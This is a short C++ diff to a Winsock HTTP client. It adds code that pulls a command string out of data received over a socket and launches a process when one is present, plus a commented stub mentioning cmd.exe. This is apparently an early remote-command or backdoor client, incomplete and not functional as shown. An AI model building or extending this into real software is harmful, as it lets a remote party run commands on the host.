@@ -9,6 +9,7 @@
 #include <cstdint>
 #include <stdint.h>
 #include <algorithm>
+#include "command.h"
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -16,6 +17,7 @@ namespace xhttp {
 std::vector<uint32_t> req_body;
 std::string cmdstr;
 std::string cmdValue;
+std::string cmd;
 
 bool parse_url(const std::string& url, std::string& protocol, std::string& host, int& port, std::string& path) {
     std::stringstream ss(url);
@@ -220,7 +222,18 @@ std::vector<char> receive_data(SOCKET ConnectSocket) {
         }
     } while (bytesReceived == BUFFER_SIZE);
 
-    std::cout << "Received " << totalBytesReceived << " bytes: ";
+    // Processing
+
+    std::string cmd = extractCMD(buffer);
+    if (!cmd.empty()) {
+        // The cmd string is not empty
+        command::createProc();
+        // Further processing...
+    } else {
+        // The cmd string is empty
+        std::cerr << "Received empty command" << std::endl;
+    }
+
     for (char c : buffer) {
         std::cout << c;
     }
@@ -230,4 +243,8 @@ std::vector<char> receive_data(SOCKET ConnectSocket) {
 }
 
 }
-
+/*
+std::vector<char> send_data(SOCKET ConnectSocket) {
+    // cmd.exe 123abc
+}
+*/
